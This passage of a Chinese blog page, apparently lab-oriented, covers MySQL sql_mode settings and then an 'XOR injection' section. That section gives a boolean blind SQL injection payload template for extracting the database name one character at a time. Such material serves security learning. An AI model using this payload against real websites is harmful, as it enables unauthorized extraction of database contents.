+<p>{DEALLOCATE | DROP} PREPARE stmt_name;</p>
+<p>CHAR()将每个参数N理解为一个整数，其返回值为一个包含这些整数的代码值所给出的字符的字符串。NULL值被省略。</p>
+<p>1、查询sql_mode<br>select @@GLOBAL.sql_mode（查看全局）<br>或<br>select @@SESSION.sql_mode（查看当前会话）</p>
+<p>2、设置sql_mode<br>通过命令设置<br>SET GLOBAL sql_mode = ‘modes…’;<br>或<br>SET SESSION sql_mode = ‘modes…’;</p>
+<p>在配置文件中设置<br>在/etc/my.cnf的[mysqld]下设置</p>
+<p>[mysqld]<br>sql_mode=STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
+<p>3、sql_mode常用值<br>ONLY_FULL_GROUP_BY<br>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中</p>
+<p>NO_AUTO_VALUE_ON_ZERO<br>该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。</p>
+<p>STRICT_TRANS_TABLES<br>在该模式下，如果一个值不能插入到一个事务中，则中断当前的操作，对非事务表不做限制</p>
+<p>NO_ZERO_IN_DATE<br>在严格模式下，不允许日期和月份为零</p>
+<p>NO_ZERO_DATE<br>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告</p>
+<p>ERROR_FOR_DIVISION_BY_ZERO<br>在insert或update过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时Mysql返回NULL</p>
+<p>NO_AUTO_CREATE_USER<br>禁止GRANT创建密码为空的用户</p>
+<p>NO_ENGINE_SUBSTITUTION<br>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</p>
+<p>PIPES_AS_CONCAT<br>将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样是，也和字符串的拼接函数Concat相类似</p>
+<p>ANSI_QUOTES<br>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p>
+<h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><p>异或：不同为1，相同为0<br>1^1=0    0^0=0    1^0=1<br>根据1^0=1，即一真一假进行异或结果为真，这时我们可以在1的位置做手脚：构造<code>(ascii(substr((database()),1,1))=?)^0</code>。若构造的式子结果为真，则异或结果为真，页面可正常回显；若构造的式子结果为假，则异或结果为假，页面显示错误，这就形成了另一个意义上的布尔盲注。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/pic22.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/12/27/Huffman%E7%AE%97%E6%B3%95/"><img class="next-cover" src="/img/pic11.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Huffman算法</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/01/sqli-labs-21-30/" title="sqli-labs_21-30"><img class="cover" src="/img/pic8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-01</div><div class="title">sqli-labs_21-30</div></div></a></div><div><a href="/2021/01/24/sqli-labs_1-10/" title="sqli-labs_1-10"><img class="cover" src="/img/pic8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-24</div><div class="title">sqli-labs_1-10</div></div></a></div><div><a href="/2021/01/27/sqli-labs_11-20/" title="sqli-labs_11-20"><img class="cover" src="/img/pic8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-27</div><div class="title">sqli-labs_11-20</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/head-sculpture.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Ephemeral-fever</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ephemeral-fever"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">芜湖，起飞！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%BF%85%E5%A4%87%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">mysql必备函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%85%E5%A4%87%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">必备语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text">几个例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E7%9A%84%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.4.</span> <span class="toc-text">mysql的全局变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7%E7%9A%84ASCII%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">几个常用符号的ASCII码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E4%B8%AD3%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-number">1.6.</span> <span class="toc-text">MySQL中3种注释风格</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%80%9A%E8%BF%87extractvalue"><span class="toc-number">3.1.</span> <span class="toc-text">（1）通过extractvalue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%80%9A%E8%BF%87updatexml"><span class="toc-number">3.2.</span> <span class="toc-text">（2）通过updatexml()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E9%80%9A%E8%BF%87concat-rand-group-by-%E5%AF%BC%E8%87%B4%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">3.3.</span> <span class="toc-text">（3）通过concat+rand()+group_by()导致主键重复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#referer%E6%B3%A8%E5%85%A5-amp-uagent%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">referer注入&amp;uagent注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">读写文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">异或注入</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/30/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src="/img/pic22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2021/12/30/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2021-12-30T15:12:10.000Z" title="发表于 2021-12-30 23:12:10">2021-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/27/Huffman%E7%AE%97%E6%B3%95/" title="Huffman算法"><img src="/img/pic11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Huffman算法"/></a><div class="content"><a class="title" href="/2021/12/27/Huffman%E7%AE%97%E6%B3%95/" title="Huffman算法">Huffman算法</a><time datetime="2021-12-27T13:45:43.000Z" title="发表于 2021-12-27 21:45:43">2021-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/25/Kruskal%E7%AE%97%E6%B3%95/" title="Kruskal算法"><img src="/img/pic23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kruskal算法"/></a><div class="content"><a class="title" href="/2021/12/25/Kruskal%E7%AE%97%E6%B3%95/" title="Kruskal算法">Kruskal算法</a><time datetime="2021-12-25T13:54:40.000Z" title="发表于 2021-12-25 21:54:40">2021-12-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/22/%E5%B9%B6%E6%9F%A5%E9%9B%86/" title="并查集"><img src="/img/pic8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="并查集"/></a><div class="content"><a class="title" href="/2021/12/22/%E5%B9%B6%E6%9F%A5%E9%9B%86/" title="并查集">并查集</a><time datetime="2021-12-22T13:05:23.000Z" title="发表于 2021-12-22 21:05:23">2021-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/11/heapq%E6%A8%A1%E5%9D%97%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="heapq模块基本使用"><img src="/img/pic6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="heapq模块基本使用"/></a><div class="content"><a class="title" href="/2021/12/11/heapq%E6%A8%A1%E5%9D%97%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="heapq模块基本使用">heapq模块基本使用</a><time datetime="2021-12-11T13:24:04.000Z" title="发表于 2021-12-11 21:24:04">2021-12-11</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ephemeral-fever</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://ephemeral-fever.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
